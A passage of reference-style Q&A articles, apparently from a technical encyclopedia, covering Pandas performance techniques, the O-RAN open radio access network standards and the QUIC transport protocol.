With a few annotations to Python code ( ` @numba.jit ` , ` @numba.vectorize ` , etc ) , runtime performance can come close to C / C++ or Fortran .
There 's support for both CPU and GPU hardware .
However , as of Numba v0.20 , optimizations work on NumPy arrays and not Pandas objects .
` eval ( ) ` and ` query ( ) ` : For datasets larger than 10,000 rows , ` pandas.eval ( ) ` , ` DataFrame.eval ( ) ` and ` DataFrame.query ( ) ` evaluate expressions faster .
Only some expressions can be optimized .
For example , ` is ` , ` lambda ` , ` yield ` , comprehensions and generator expressions ca n't be optimized .
Package numexpr needs to be installed .
Pandas User Guide documents all the above techniques with useful code examples .
Particularly for large datasets , Panda official documentation recommends numexpr that uses multiple cores , smart chunking and caching ; and bottleneck that uses Cython routines to speed up some types of ` nan ` evaluations .
How does Pandas compare against NumPy in terms of performance ?
On subsetting operation , NumPy outperforms Pandas by 10x to 1000x .
Source : Żero 2020 , fig .
1 .
NumPy is faster than Pandas because most of the calculations happen using precompiled optimized C code .
Although Pandas makes use of NumPy , it does a lot of housekeeping : tracking data types and indices , and checking for errors .
This makes Pandas slower than NumPy .
Therefore , one way to speed up the Panda code is to convert critical computations into NumPy , for example by calling the ` to_numpy ( ) ` method .
One study on selecting a data subset showed NumPy outperforming Pandas by 10x to 1000x , with the gains diminishing on very large datasets .
Regardless of dataframe size , Pandas paid an initial penalty of 1ms .
Similar results were seen when taking square root of numbers .
Within NumPy , operations within an array are faster than operations that span multiple arrays .
Thus , ` a1 + a2 ` is slower than ` np.sum(a_both , axis=1 ) ` if we reorganize the data as ` a_both[0 , :] = a1 ` and ` a_both[1 , :] = a2 ` .
How do I deal with large datasets in Pandas ?
Pandas does in - memory analytics , which makes it difficult to handle large datasets that do n't fit into system memory .
One approach is to load less data , such as loading only columns needed for analysis .
For example , ` pandas.read_csv ( ) ` has an argument ` usecols ` to do this .
Use efficient datatypes .
Text data of low cardinality are those with a lot of values but only a few unique values .
Storing each value as a complete string is memory inefficient .
Instead , they should be stored as categorical data .
Data with all unique values will not benefit from such a conversion .
Numerical values can be downcast to the smallest types using ` pandas.to_numeric ( ) ` .
Chunking is a technique to split the dataset and process it into chunks .
This works best when chunks require little coordination .
Some methods , such as ` pandas.read_csv ( ) ` have argument ` chunksize ` to do chunking .
Group - by operations are typically harder to do in chunks .
Where complex expressions are involved , such as ` ( df .
A < 0.5 ) & ( df .
B < 0.5 ) ` ) , each sub - expression creates a temporary memory .
This can be avoided with ` pd.eval ( ) ` , ` df.eval ( ) ` and ` df.query ( ) ` .
This improves performance only on large datasets .
How do Pandas store a dataframe under the hood ?
DataFrames columns are grouped into blocks and managed by the BlockManager .
Source : Tratner 2015 , slide 36 .
Pandas group columns of the same type into what is called a block .
A DataFrame is actually stored as one or more blocks .
Using metadata , these blocks are composed into a DataFrame by a BlockManager .
Thus , only a block is contiguous in memory .
It 's possible to inspect the blocks using ` df['A'].values.base ` for column A. The output will also show the values of other columns in that block .
To see the internal storage of all blocks , call ` df._data ` .
Referring to the figure , slicing with ` df.loc[:'2015 - 07 - 03 ' , [ ' quantity ' , ' points ' ] ] ` does n't involve data copy since both columns are of the same data type .
But any cross - dtype slicing will typically involve copying .
Another performance killer is appending a row to a dataframe .
This would result in reallocating memory and copying every block .
Thus , it 's better to concatenate two big datasets rather than append one to the other row by row .
When a new column is added , block copy is deferred until an operation requires it .
Which third - party libraries help improve Pandas 's performance ?
Dask or PySpark can be suitable for large datasets .
Source : Zhang 2019 .
Indexing involves lots of lookups .
Klib is a C implementation that uses less memory and runs faster than Python 's dictionary lookup .
From version 0.16.2 , Pandas already uses klib .
To run on multiple cores , use multiprocessing , Modin , Ray , Swifter , Dask or Spark .
In one study , Spark did best at reading / writing large datasets and filling in missing values in .
Pandas did best for group - by operation .
An advantage of Swifter is that it decides what to use ( vectorization , Pandas apply or Dask ) depending on the dataset size .
The Swifter can also be used along with Modin .
In fact , Modin partitions data in an optimal way but can work with other libraries that perform parallel execution .
Dask can use multiple threads or processes on a single machine or a cluster of machines .
Combining Numba with Dask is even better .
PySpark is suitable for very large datasets , but Pandas offers better APIs .
A suitable approach is to use Spark with Apache Arrow .
Arrow is an in - memory columnar format that helps to efficiently transfer data between Spark and Pandas .
Based on Arrow , PyPolars is a highly performant DataFrame library .
Wes McKinney , creator of Pandas , writes about BlockManager in a blog and explains how it works .
It 's the internal data structure in Pandas .
A block is really a " homogeneously - typed N - dimensional NumPy ndarray object " .
Gluing together columns of the same type into a single block is called consolidation .
In the early days of Pandas ( 0.1 and 0.2 ) , a dataframe was stored using Python ` dict ` until the BlockManager took over .
With the release of Pandas 0.16.2 , the klib package has been used to improve the performance of indexing .
This takes less memory and runs faster than Python 's dictionary .
This should not be confused with klib ( first released in April 2020 ) , a library that simplifies visualization of DataFrame .
McKinney notes on his blog that Pandas requires typically 5 - 10 times RAM the size of the dataset .
This is bad for analytics on large datasets .
What 's needed is a columnar format optimized for analytics with zero - copy access .
This is where Apache Arrow fits in .
Arrow 0.1.0 was released in October 2016 .
As a library for parallel computing in Python , Dask 1.0.0 has been released .
The Pandas DataFrame becomes a Dask DataFrame whose processing can be scheduled on multiple threads / processes of a single machine or distributed across machines .
Dask takes care of the task scheduling .
The release of Dask 0.2.0 can be traced to January 2015 .
Pandas 1.0.0 has been released .
This provides a number of performance improvements .
We mention a few : DataFrame arithmetic and comparison operations with scalars ; indexing with a non - unique IntervalIndex ; initializing a DataFrame using a range ; ` DataFrame.select_dtypes ( ) ` uses vectorization instead of a loop ; comparing a Categorical with a scalar and the scalar is not found in the categories .
Speed comparison of vectorized function , Pandas / Dask / Swifter apply .
Source : Swifter GitHub 2020 .
Swifter 1.0.0 has been released .
Swifter " efficiently applies any function to a pandas dataframe or series in the fastest available manner " .
If the function can be vectorized , it vectorizes it .
If not , it selects the best of Pandas , Dask or Swifter apply method .
Swifter can be traced to April 2018 when version 0.1 was released .
PyPolars shows faster execution and lower memory usage for GroupBy operation .
Source : Polars GitHub 2021 .
Package PyPolars 0.1.0 is released .
It 's implemented in Rust and uses Apache Arrow as its memory model .
It supports lazy and eager evaluations .
On datasets larger than 10,000 rows , it outperforms both pandas and pydatatable ( another DataFrame library ) .
Panda roadmap as on this date notes a few items related to performance .
Apache Arrow may be explored as an in - memory array library .
At the least , Pandas would interoperate better with Arrow .
BlockManager and 2-D blocks are complex .
They could be replaced with a simpler collection of 1-D arrays .
BlockManager uses both labels and positions for indexing .
In the future , it might use only the latter .
Where Pandas accepts user - defined functions , developers should be able to provide Numba - jitted functions .
Aspects specified by the O - RAN Alliance .
Source : Kafka 2019 , slide 2 .
Traditionally , mobile network operators have relied on network equipment vendors for RAN hardware .
Vendors are few in number and their equipment is specialized and expensive .
With 4G/5 G , small cell deployments are more common , which is driving up deployment and maintenance costs .
The real problem is that operators are at the mercy of vendors .
Vendors implement proprietary protocols and technologies resulting in vendor lock - in .
O - RAN changes this by enabling multi - vendor deployments and open interoperable interfaces .
O - RAN also enables virtualization and AI - based optimization .
O - RAN is a set of standards that specifies open RAN interfaces , nodes , profiles and services .
The operator - led O - RAN Alliance oversees the development of O - RAN .
It also facilitates interoperability testing .
Operators can therefore buy O - RAN compliant hardware from any vendor .
To speed up adoption and innovation , O - RAN Alliance sponsors open source development of RAN software .
Who started O - RAN and how are they organized ?
O - RAN Alliance logo and some of its members .
Source : Telecom Lead 2021 .
The main organization behind O - RAN standards is the O - RAN Alliance .
This was started in February 2018 by five mobile network operators , AT&T , China Mobile , Deutsche Telekom , NTT DOCOMO and Orange .
In fact , the alliance was a merger of xRAN Forum ( led by NTT DOCOMO ) and C - RAN Alliance ( led by China Mobile ) .
By mid-2020 , the O - RAN Alliance will expanded to 24 global operators and 148 contributors .
Contributors include chipset manufacturers , network equipment manufacturers , radio element manufacturers , software vendors , service providers , and academic institutions .
Despite this diversity , the Alliance is led by operators .
Operators are the only members who get to vote at the AGM .
The O - RAN Alliance defines RAN standards and supports members towards interoperability testing .
In cooperation with the Linux Foundation , it also sponsors the O - RAN Software Community ( SC ) for open source development for the RAN .
Thus , O - RAN Alliance defines the open architecture and specifications that O - RAN SC uses to develop open source software for industry deployment .
Ultimately , the O - RAN Alliance 's mission is to reshape the RAN industry towards more intelligent , open , virtualised and fully interoperable mobile networks .
Could you clarify the terms Open RAN , OpenRAN , O - RAN , vRAN and C - RAN ?
Terms commonly associated with O - RAN .
Source : Devopedia 2021 .
Open RAN is a generic term that refers to open RAN architectures including open interfaces , virtualization , and use of AI .
OpenRAN is a project initiated by the Telecom Infra Project ( TIP ) .
It 's an attempt to realize the Open RAN concept .
Its work covers 2G/3G/4G/5G. As inputs , OpenRAN uses 3GPP and O - RAN specifications .
O - RAN can refer to the O - RAN Alliance or standards created by the Alliance .
It complements 3GPP specifications by defining interface profiles , new open interfaces and new nodes .
O - RAN addresses 5 G RAN interfaces including the X2 interface between 4 G and 5 G base stations .
vRAN ( Virtualized RAN ) makes the RAN software - defined and programmable .
Whereas Open RAN focuses on openness , vRAN is really about moving functionality from hardware to software .
vRAN started at 4 G with proprietary interfaces , later extended to 2G/3 G ( OpenRAN ) and 5 G ( OpenRAN or O - RAN ) .
C - RAN ( Cloud RAN ) is a vRAN built on cloud native technologies , such as microservices , containers and CI / CD .
Confusingly , C - RAN is also sometimes used to mean Centralized RAN where processing is centralized in CU or DU , away from RU .
When 3GPP has already standardized RAN , why do we need O - RAN ?
Why do we need O - RAN standards ?
Source : ParallelWireless 2020b .
NG - RAN nodes are not designed as monoliths .
They are disaggregated such that multiple Radio Units ( RUs ) connect to a Distributed Unit ( DU ) and multiple DUs connect to a Centralized Unit ( CU ) .
The RU - DU link is called fronthaul .
The DU - CU link is called midhaul .
The CU - Core link is called backhaul .
3GPP has standardized many NG - RAN interfaces : NG ( NR - RAN and 5GC ) , Xn ( gNB and gNB / ng - eNB ) , X2 ( gNB and eNB ) , F1 ( gNB - DU and gNB - CU ) , W1 ( ng - eNB - DU and ng - eNB - CU ) , and E1 ( gNB - CU - CP and gNB - CU - UP ) .
However , fronthaul interfaces have not been standardized , thus forcing operators to buy RU and DU hardware from the same vendor .
Moreover , X2 was seen as an optional interface .
Vendors often add proprietary techniques to this interface .
Therefore , when expanding to 5 G NR , a 4G / LTE operator with eNB equipment is forced to buy gNB equipment from the same vendor .
O - RAN standardizes the fronthaul .
It opens up new interfaces including A1 / O1 / O2 / E2 .
It specifies aspects of RAN virtualization .
It also standardizes F1 / W1 / E1 / X2 / Xn interfaces already covered by 3GPP but the intention is to complement 3GPP standards .
For example , O - RAN specifies profiles .
What 's the O - RAN architecture ?
O - RAN architecture .
Source : O - RAN Alliance 2018 , fig .
1 .
O - RAN reference architecture disaggregates the RAN into RU , DU and CU .
Moreover , user plane ( UP ) and control plane ( CP ) are disaggregated .
RRC , SDAP and PDCP are in CU .
Given a lower layer functional split , RLC , MAC and higher - PHY are in DU ; lower - PHY and RF are in RU .
A key functional module is the RAN Intelligent Controller ( RIC ) .
This is decomposed into two parts based on real time ( RT ) capabilities : RIC non - RT : Execution exceeding 1s .
Part of the Orchestration / NMS layer .
Functions include service and policy management , RAN analytics and model training for RIC near - RT .
Core algorithms are developed by operators .
RIC near - RT : Execution within 1s .
next generation RRM that uses AI / ML models trained and passed on from RIC non - RT .
Functions include load balancing , RB management , interference detection / mitigation , QoS management , connectivity management and seamless handover control .
A robust , secure and flexible platform for third - party applications .
RIC near - RT uses the Radio - Network Information Base ( RNIB ) , which gets near - RT state of the radio network via E2 and commands from RIC non - RT via A1 .
RIC near - RT and Multi - RAT CU platforms are often virtualized so that capacity can be distributed across multiple network elements .
Which are the interfaces relevant to O - RAN ?
O - RAN logical architecture diagram showing the main interfaces .
Source : Metaswitch 2021 .
The NG interface connects NG - RAN to 5 G Core .
It 's completely specified by 3GPP .
Otherwise , O - RAN interfaces include : Open Fronthaul : DU - RU lower layer functional split .
It consists of the Control , User and Synchronization ( CUS ) plane and Management plane .
Although Common Public Radio Interface ( CPRI ) is a standard commonly used at fronthaul , vendors often modified it in proprietary ways .
O - RAN standardizes this interface .
A1 : Carries network or UE - level information from eNB / gNB to RIC non - RT to optimize the network and ensure SLAs .
E2 : Interfaces RIC near - RT with CU / DU .
Carries measurements from CU / DU and configuration commands to CU / DU .
F1 / W1 / E1 / X2 / Xn : Existing 3GPP interfaces but enhanced by O - RAN for multi - vendor interoperation .
Interfaces for the Multi - RAT CU platform .
F1 is the CU - DU higher layer functional split .
O1 : An Operations and Maintenance ( OAM ) interface .
Functions include management of provisioning , fault supervision , performance assurance , tracing , files , heartbeat , and Physical Network Function ( PNF ) software .
O2 : Service provider functionality resides in Service Management and Orchestration ( SMO ) while cloud provider functionality resides in O - Cloud .
This interface connects the two .
It 's developed into cloud infrastructure management and deployments on the infrastructure .
What are O - RAN Workgroups and Focus Groups ?
The work of O - RAN is organized into workgroups .
These include WG1 : Use Cases and Overall Architecture , WG2 : The Non - real - time RAN Intelligent Controller and A1 Interface , WG3 : The Near - real - time RIC and E2 Interface , WG4 : The Open Fronthaul Interfaces , WG5 : The Open F1 / W1 / E1 / X2 / Xn Interface , WG6 : The Cloudification and Orchestration , WG7 : The White - box Hardware Workgroup , WG8 : Stack Reference Design , and WG9 : Open X - haul Transport .
In addition , there are a few focus groups : Standard Development Focus Group ( SDFG ) : Strategizes standardization effort .
Coordinates and liaises with other standard organizations .
Test & Integration Focus Group ( TIGF ) : Defines test and integration specifications across workgroups .
Open Source Focus Group ( OSFG ) : Successfully established O - RAN SC .
Otherwise , it 's currently dormant .
In O - RAN , what is meant by white - box hardware ?
Lanner 's whitebox hardware for DU and CU .
Source : Lanner 2020 .
White - box implies general - purpose vendor - neutral hardware , often called Commercial Off - the - Shelf ( COTS ) hardware .
White - box hardware is common in IT .
With O - RAN , it 's coming to telecom .
White - box hardware is expected to bring down deployment costs .
It enables the decoupling of hardware and software .
It opens up the market to small players .
Hardware vendors can make equipment conforming to O - RAN white - box specifications without worrying about the complexity of software .
Operators and software vendors can focus on software with the foreknowledge of the hardware .
O - RAN specifies " high performance , spectral and energy-efficient white - box base station hardware " .
It publishes reference hardware designs and software architecture for both O - DU and O - CU , where the prefix " O- " signifies O - RAN specification .
O - RAN has defined hardware requirements for different deployment scenarios ( indoor pico , outdoor pico / micro / macro , IAB ) and different architectures ( split vs integrated ) .
Performance requirements are specified in terms of peak data rate , peak spectral efficiency , bandwidth , latency , and mobility .
Among the different split architectures , WG7 has considered options 6 ( all PHY in O - RU ) , 7 - 2 ( lower PHY in O - RU , higher PHY is O - DU ) and 8 ( all PHY in O - DU ) .
Could you share details on O - RAN slicing ?
Example : O - RAN slicing deployment .
Source : O - RAN Alliance 2020f , fig .
1 .
Network slicing is defined primarily by 3GPP but there are aspects studied by ONAP , ETSI and GSMA .
O - RAN includes a slicing framework and architecture to realize 3GPP 's network slicing .
In particular , there 's an impact on RIC , O - CU , O - DU , and A1 / E2 / O1 / O2 interfaces .
A network slice has two parts , RAN slice and CN slice .
O - RAN slicing is concerned with only RAN slices .
Non - RT RIC should be aware of RAN slices , slice configuration and performance metrics .
These become inputs to AI / ML models for slice assurance and optimization that 's done over O1 interface .
Dynamic slice optimization is done by Near - RT RIC to prevent SLA violations .
Near - RT RIC collects slice performance metrics over the E2 interface , applies its algorithms and optimizes slices over E2 .
3GPP defines Network Slice Management Function ( NSMF ) and Network Slice Subnet Management Function ( NSSMF ) .
For these functions , O - RAN provides multiple deployment options .
They can be within or outside the SMO .
What are some challenges when it comes to adoption of O - RAN or Open RAN in general ?
Even if operators introduce O - RAN compliant hardware for 4G/5 G , their earlier investments in legacy equipment prevent them from reaping the benefits of a single virtualized and flexible RAN architecture .
Lack of fibre or cost - efficient transport can be a bottleneck for deployment of open fronthaul and midhaul .
Some network vendors , such as Ericsson and Huawei are holding out against O - RAN .
Huawei has n't joined the O - RAN Alliance .
It believes that its integrated offering is more performant and ca n't be matched by disaggregated white - box hardware .
However , Huawei supports the ONAP initiative for better interoperability .
Detractors of O - RAN believe that disaggregated hardware can compromise overall network security .
It 's been said that the " main issue with disaggregation is aggregation " .
While disaggregated multi - vendor hardware is attractive , it 's not trivial to integrate and achieve an end - to - end interoperable solution .
Operators have the challenge of selecting the right hardware from multiple vendors and also building in - house integration expertise .
On the other hand , there 's a new opportunity for system integrators .
What are some useful resources to know more about O - RAN ?
O - RAN specifications can be downloaded for free but require acceptance of the O - RAN ALLIANCE Adopter License Agreement .
To follow the status of O - RAN open source implementation , visit the homepage of O - RAN SC .
The site includes documentation of the latest release .
The Telecom Infra Project ( TIP ) was founded to address the lack of innovation , high costs and a closed ecosystem ruling the telecom world .
It started the OpenRAN initiative .
OpenRAN is meant to spur innovation , enable supplier diversity and reduce costs .
The First OpenRAN trials start in 2017 , in India and Latin America , particularly in rural areas where the user base is low and Average Revenue Per User ( ARPU ) is also low .
Operators AT&T , China Mobile , Deutsche Telekom , NTT DOCOMO and Orange came together and started the O - RAN Alliance .
The O - RAN Alliance creates standards , unlike TIP that does n't create standards but promotes OpenRAN .
The shift from traditional to next generation open RAN .
Source : Tamaskar 2019 .
In an online article , Tamaskar of Radisys writes that 2019 may be the year for Open RAN .
She notes the work of both the O - RAN Alliance and Telecom Infra Project ( TIP ) .
We may see more collaboration between these two groups .
Just as the Self - Organizing Network ( SON ) brought automation to RAN management , planning and optimization , O - RAN will use AI to automate operations and reduce costs .
Rakuten announces the world 's first virtualized , cloud - native greenfield 4 G network .
However , it 's not based on O - RAN standards .
It 's based on Nokia 's X2 interface , that Nokia opened up for integration with another vendor .
O - RAN WG5 publishes O - RAN NR profiles for EN - DC ( E - UTRA New Radio Dual Connectivity ) for both C - plane and U - plane .
Initial 5 G deployments are expected to be in Non - Standalone ( NSA ) mode , in which a UE will connect to LTE / eNB as master node and via Dual Connectivity connect to 5G / gNB as slave node .
This is referred to as EN - DC or option 3 .
This deployment option was first standardized by 3GPP in Release 15 ( early drop ) in December 2017 .
NTT DOCOMO 's multi - vendor NG - RAN deployment to O - RAN specifications .
Source : NTT DOCOMO 2019 .
NTT DOCOMO claims to be the world 's first to deploy multi - vendor RAN conforming to O - RAN specifications .
Its new pre - commercial 5 G service is deployed with its existing 4 G network .
This is what we call a 5 G NSA network that makes use of the X2 interface between 4 G and 5 G base stations .
The O - RAN Software Community releases the first version ( Amber Release ) of its open source software .
Since O - RAN specifications continue to be developed , this must be considered as pre - specification software with limited capabilities .
Subsequent releases include Bronze Release ( June 2020 ) and Cherry Release ( December 2020 ) .
Mavenir founded the Open RAN Policy Coalition ( ORPC ) .
This is a coalition to promote policies leading to open interoperable RAN solutions .
It 's not a standardization body .
In May , Nokia joined ORPC .
In January 2021 , ORPC joins a coalition of coalitions that includes BSA , GSMA , CableLabs , and TIP .
The O - RAN Alliance and GSMA announced a partnership to accelerate the adoption of Open RAN and thereby benefit from new virtualization architectures .
This follows an earlier announcement in February when O - RAN Alliance partnered with TIP .
Nokia and Samsung announced OpenRAN products for 5G. Meanwhile , Ericsson and Huawei made no similar announcements , though Ericsson is a contributor to the O - RAN Alliance .
The O - RAN Software Community makes the Cherry Release of O - RAN open source software .
It 's aligned with the latest O - RAN specifications and brings the implementation closer to commercial deployments .
QUIC 's place in the networking stack .
Source : Iyengar 2017 , slide 15 .
QUIC is a transport protocol that 's an alternative to TCP .
QUIC sits on top of UDP and uses TLS 1.3 to secure its payload .
It was initially designed for HTTP uses , but later evolved to accommodate a variety of use cases .
HTTP on top of QUIC is often called HTTP/3 .
QUIC improves TCP in a number of aspects : faster connection establishment , reduced head - of - line blocking , better congestion control , improved privacy and flow integrity .
While measurements show that QUIC outperforms TCP , there are some scenarios where TCP does better .
QUIC is being standardized by the IETF .
As of January 2021 , all documents are Internet - Drafts ( I - Ds ) and none of them are standard yet .
Many open source implementations of QUIC are available in various programming languages .
QUIC is actively used on the Internet by about 5 % of web servers .
What are the problems with the TCP / IP networking stack that QUIC aims to solve ?
HTTP/2 's multiplexed streams are still limited by a single TCP connection .
Source : Orozco 2018 .
Each HTTP connection traditionally uses a separate TCP connection .
However , opening a TCP connection is slow .
It requires three round trip times ( RTTs ) : one RTT for first contact and two RTTs for TLS security .
Given that increasingly more of web traffic is encrypted these days , RTTs due to TLS ca n't be eliminated .
Though network bandwidth has increased , exchanging short packets that are typical of web traffic is hampered due to these handshake delays .
HTTP/2 partly mitigated the TCP connection problem by allowing multiple HTTP streams to share a single TCP connection .
Thus , multiple HTTP streams can exchange data in parallel .
But since there 's only one TCP connection , a packet loss would block all HTTP streams .
This problem is called Head - of - Line ( HOL ) blocking .
It ca n't be solved unless we make changes to the transport layer .
Solving this could be important since more and more of web traffic is coming from smartphones over lossy mobile networks .
What are the key features of QUIC ?
QUIC speeds up connection setups to known servers .
Source : Orozco 2018 .
QUIC features follow from its attempt to overcome limitations of TCP / IP : Connection Setup : Connection to a known server is setup with 0-RTT .
Setup time increases only for new cryptographic key exchange or version negotiation .
By combining cryptographic and transport handshakes , setup time is less .
Stream Multiplexing : Overcomes HOL blocking issue by multiplexing QUIC streams over UDP .
The loss of a QUIC packet blocks only streams in that packet .
Flow Control : The Receiver specifies in terms of total bytes that a sender can send per stream and across streams .
Congestion Control : QUIC sits in the user space , not in the kernel space .
Hence , updates to algorithms can be made more quickly .
Different applications can potentially use different algorithms .
QUIC has been integrated with CUBIC and BBR algorithms .
RTT estimates are better .
Connection Migration : Connection is preserved even if the underlying client IP address changes .
Such changes are common with mobile clients , such as switching between Wi - Fi and cellular .
Forward Error Correction ( FEC ) and ACK entropy are two early features of QUIC that were later removed since maintenance costs outweighed the benefits .
Are n't problems with TCP / IP already solved by TFO and SCTP ?
Indeed , there are techniques such as TLC Snapstart and TCP Fast Open ( TFO ) that reduce setup time .
In fact , QUIC 's 0-RTT is inspired by these earlier approaches .
Likewise , the Stream Control Transmission Protocol ( SCTP ) can multiplex at the transport layer .
However , network middleboxes interfere with the end - to - end principle .
To optimize delivery of packets within the network , network operators may meddle with TCP headers , drop packets or track connections .
Firewalls block unfamiliar packets .
Network Address Translators ( NATs ) rewrite transport headers .
These practices made it difficult to introduce changes such as TFO or SCTP across the Internet .
In fact , the term network ossification is used in this context .
QUIC can also suffer from network ossification .
To prevent this , QUIC encrypts most of the protocol information , including some fields of QUIC packet headers .
Middleboxes ca n't know much about what is carried and ca n't attempt to optimize delivery in non - standard ways .
The long term benefit is that QUIC can evolve without worrying if middleboxes will support the changes .
QUIC semantics remain end - to - end .
What are QUIC , gQUIC and iQUIC ?
QUIC started on Google in 2012 .
IETF started standardizing it in 2016 , but as of January 2021 , it 's still a draft .
Meanwhile , many implementations of QUIC are already out there , some supporting Google 's QUIC and others focusing on IETF 's QUIC .
It 's common to say gQUIC for Google 's QUIC .
Sometimes the term iQUIC has been used to refer to IETF 's QUIC .
When QUIC becomes a standard and becomes more widely supported , we expect the term QUIC to refer to IETF 's QUIC .
Some already use QUIC in this sense .
For now , whenever adoption or performance numbers are mentioned , it would be wise to check the version used for the study .
It 's worth noting that gQUIC was specified as a monolith .
IETF QUIC is more modular .
Core QUIC transport , TLS with QUIC , congestion control , header compression , HTTP mapping to QUIC , version negotiation are all separate IETF drafts .
gQUIC 's cryptographic handshake was called QUIC - Crypto .
This inspired the creation of TLS 1.3 that 's used by QUIC .
Clients and servers can support multiple versions and negotiate the version during connection setup .
Version numbers ` 0x00000001 - 0x0000ffff ` are reserved for the standard .
gQUIC and iQUIC versions have separate ranges .
What are some essential terms about QUIC ?
Here are some essential QUIC terms to know : Stream : A lightweight , ordered byte - stream abstraction .
A stream can be unidirectional or bidirectional , created by either endpoint .
Streams are prioritized but priority is set by the application .
Frame : A unit of structured protocol information .
There are many frame types .
Only some of them carry streams , one stream per frame .
Other frame types are for control .
Packet : A complete processable unit of QUIC .
Multiple packets can be part of the same UDP datagram .
Packets are confidentiality and integrity protection .
A packet can include multiple streams , but a packet loss blocks all its streams for retransmission .
Preferably , a packet carries fewer streams .
Packet payload is a sequence of one or more frames .
Packet numbers are never reused within a connection , even for retransmissions .
Header : Part of a QUIC packet .
The headers can be long ( 4 types ) or short ( 1 type ) .
Some header fields are encrypted .
Connection : A shared state between client and server , which are the connection endpoints .
Connection parameters are agreed during the handshake phase .
Connection ID helps with correct packet delivery even when lower layer addressing changes .
What are some criticisms of QUIC ?
We note these criticisms or concerns about QUIC ( likely to be overcome as QUIC matures ) : Security : Network attacks on UDP are common to the extent that some enterprises and operators block UDP traffic except those arriving on port 53 for DNS .
0-RTT can be misused for replay attacks , which can be a problem with non - idempotent requests .
QUIC traffic is also not recognized or analysed by firewalls .
Network Control : Since transport layer headers are encrypted , network operators ca n't optimize their networks to manage congestion .
For example , they ca n't know if a packet is an ACK or a retransmission .
Estimating RTT is more difficult .
The only options appear to be a single Spin Bit and IP - level Explicit Congestion Notification ( ECN ) .
Performance : Compared to TCP , UDP implementations are less performant .
QUIC takes up too much CPU time .
Low - end smartphones and IoT devices will suffer .
Latency : 0-RTT works only if load balancers maintain state and route to the same server .
Since multiple versions can co - exist , each version negotiation takes an extra RTT .
Fairness : Since QUIC is in the user space , applications and servers could implement more aggressive Congestion Control Algorithms ( CCAs ) that make it unfair for non - QUIC connections .
Could you compare the performance of QUIC against TCP / IP ?
Comparing performance of gQUIC v34 vs TCP : gQUIC outperforms TCP ( red ) or TCP outperforms gQUIC ( blue ) .
Source : Kakhki et al .
2019 , fig .
6 .
In one study , gQUIC outperformed TCP+HTTPS in desktop environments , due to 0-RTT and quick loss recovery .
In fluctuating bandwidths , QUIC did better due to better ACK handling and more accurate RTT estimates .
However , QUIC was sensitive to out - or - order delivery , which it perceives as a loss .
QUIC is poorer on smartphones since it runs in user space .
It 's hard to handle lots of small packets .
It 's also unfair for TCP to consume more than its share of bandwidth .
Researchers at RWTH Aachen University compared TCP+TLS1.3+HTTP/2 versus gQUIC performance under different network conditions .
TCP parameters were fine - tuned .
On a lossy network , QUIC performed better .
In another test , visual web page performance was not all that different .
They comment that fine - tuning TCP might suffice .
Experiments by Fastly showed that QUIC performed poorly due to expensive memory copies between user space and kernel space .
However , they matched TCP 's performance by delaying ACK ( a QUIC extension ) , using a Linux feature called Generic Segmentation Offload ( GSO ) , and increasing the Maximum Transmission Unit ( MTU ) length .
What are some resources to get started with QUIC ?
IETF 's QUIC WG webpage is the place to track the latest in standardization , or download current versions of documents .
The QUIC project page at Chromium is worth reading .
Its FAQ shows how to test a QUIC server against Chrome or build a standalone QUIC server and client .
The Chrome browser enables QUIC by default .
In other popular browsers , HTTP/3 and QUIC can be enabled by setting specific configuration flags .
Implementers can join the quicdev Slack channel to coordinate interoperability testing .
There are already many implementations of QUIC , lists of which are maintained on QUIC WG 's Wiki and on Wikipedia .
An interoperability matrix is also available online .
We note a few of these implementations : Chromium ( C / C++ ) , ngtcp2 ( C ) , nginx ( C ) , quic - go ( Go ) , and quicker ( NodeJS / TypeScript ) .
In 2018 , it was commented that only some implementations support all the advanced features .
Very few map HTTP/3 to QUIC .
Could you share some tools for debugging or analysing QUIC traffic ?
Decoding a QUIC packet in Wireshark .
Source : CellStream 2021 .
It 's possible to capture QUIC traffic and analyze it offline within Chrome .
Another tool is Wireshark .
Since packets are encrypted , it 's possible to load the SSL secret and then decrypt the packets .
CellStream has released gQUIC and IETF QUIC profiles for Wireshark .
Multiple implementations fragmented across QUIC versions may lead to sub - optimal performance or even buggy behaviour .
Since traditional network analysis tools are tuned to TCP , new tools are needed .
Hasselt University has created useful tools to analyse QUIC traffic .
Ericsson 's Spindump is a tool that makes use of QUIC 's Spin Bit to figure out RTT for individual connections and aggregates .
It 's written in C and supports TCP , QUIC , COAP , DNS , ICMP , and SCTP traffic .
It 's also available as a library that can be linked with other programs .
QUIC evolves the transport layer , following improvements in other layers .
Source : Eggert and Lustig 2020 , slide 22 .
Google 's work on the SPDY protocol became the starting point for the standardization of HTTP/2 by the IETF .
Previously , Google made improvements to the physical layer by building its own carrier - grade networks and CDNs .
While HTTP/2 allows multiple HTTP sessions to share a single TCP connection , a single packet loss affects all sessions of that connection .
This becomes the motivation to innovate in the transport layer , thus kickstarting QUIC work .
Google engineer Roskind made public QUIC 's design document .
He notes that RTT is limited by the speed of light .
It 's high on mobile networks .
At best , we can try to reduce the number of RTTs .
QUIC is a proposal to do just that .
Roskind notes that prototype implementations are ready for real - world experiments .
Wireshark 1.12.0 has been released .
This release introduces support for Google 's QUIC .
In August 2020 , it was reported that Wireshark 's support of Google 's gQUIC and IETF 's QUIC is still evolving .
IETF accepts QUIC as an Internet - Draft .
QUIC was proposed to IETF a year earlier in June 2015 .
IETF also renames the protocol to simply QUIC from its original expanded form of Quick UDP - Based Internet Connection .
Thus , QUIC should not be treated as an acronym .
The QUIC Working Group is chartered in October .
Version 00 of Internet - Draft titled QUIC : A UDP - Based Multiplexed and Secure Transport was published in November .
In an interview , we come to learn that 3GPP Core Networks and Terminals ( CT ) Working Groups are interfacing with IETF on how to adopt QUIC for 5 G networks .
QUIC may be considered for 5 G Release 16 .
3GPP expresses concerns about protocol headers being encrypted .
They therefore provide the IETF with requirements from network providers who often like to know more about the traffic that they carry .
Meanwhile , Openwave Mobility reports more than 20 % of video traffic on the networks of 30 mobile operators use QUIC .
YouTube is a significant factor in this growth .
The term HTTP/3 is proposed in IETF as the new name for HTTP over QUIC , which has also been called HTTP/2 over QUIC .
Essentially , it 's a mapping of HTTP semantics over QUIC .
Its wire format is n't compatible with HTTP/2 .
IETF Internet - Draft version 17 titled Hypertext Transfer Protocol Version 3 ( HTTP/3 ) will be published in December .
The engineering team at Uber reports that QUIC outperforms TCP .
They used Cronet networking library for Android .
In production apps , they find that QUIC reduces tail - end latencies by 10 - 30 % even on low connectivity networks .
Tail - end latencies are a big problem for Uber , being almost six times the median value .
